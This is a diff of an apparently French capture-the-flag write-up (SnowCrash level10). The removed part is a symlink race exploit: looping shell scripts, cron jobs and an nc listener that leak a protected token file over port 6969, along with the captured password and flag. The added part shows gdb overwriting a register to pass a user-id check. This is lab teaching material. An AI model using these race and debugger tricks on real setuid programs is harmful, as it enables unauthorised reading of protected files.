@@ -6,69 +6,13 @@
 *       -> resultat
 */
 
-En executant le script level10 on remarque qu il attend un fichier et un host. Ca ressemble au niveau 8 donc utilise la methode strings et gdb pour en
-apprendre plus sur le binaire:
-    - on remarque au on utilise la fonction access donc il verifie les droits du fichiers avant de pouvoir l ouvrir
-    - aussi il utilise une connexion socket (function socket et connect) sur le port 6969
-Il va donc falloir de maniere similaire au level08 lui faire croire qu on a les droits sur le fichier token pour qu il envoie le fichier sur le socket par le port 6969.
-Ainsi on va ecrire 2 scripts:
-    - /tmp/hack:
-/*********************/
-    #!/bin/sh
-    while true; do
-    rm -rf /tmp/tok
-    ln -s ~/token /tmp/tok
-    done
-/**********************/
-Ce script créé en boucle le lien symbolique de token vers /tmp/tok. cela va permettre d exploiter le temps entre l open et l access.
+(gdb) p $eax=0xbc6
+$5 = 3014
+(gdb) continue
+Continuing.
 
-    - /tmp/method:
-/**********************/
-    #!/bin/sh
-    while tru; do
-    ~/level10 /tmp/tok 127.0.0.1
-    done
-/**********************/
-Ce script execute le binaire level10 avec le fichier tok créé au dessus et utilise le localhost.
-
-On ajoute ces 2 scripts pour etre executer en permanence (toutes les 2 minutes) avec la commande crontab -e:
-crontab -e:
-*/2 * * * * sh /tmp/hack
-*/2 * * * * sh /tmp/method
-
-En faisant un ps -aux, on peut voir les 2 scripts sont executes. Il nous suffit donc d'ecouter le port 6969 avec la commande nc et attendre que le flag sorte:
-nc -lk 6969 (option l et k force la commande a reste ecoute). Après quelques minutes, on a :
-.*( )*.
-.*( )*.
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-
-il suffit de se connecter:
-su flag10
-Password: woupa2yuojeeaaed06riuj63c
-**************************
-flag10@SnowCrash:~$ getflag
-Check flag.Here is your token : feulo4b72j7edeahuete3no7c ! 
-Et on obtient le token!
+Breakpoint 4, 0x08048de5 in main ()
+(gdb) continue
+Continuing.
+Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
+[Inferior 1 (process 5834) exited normally]
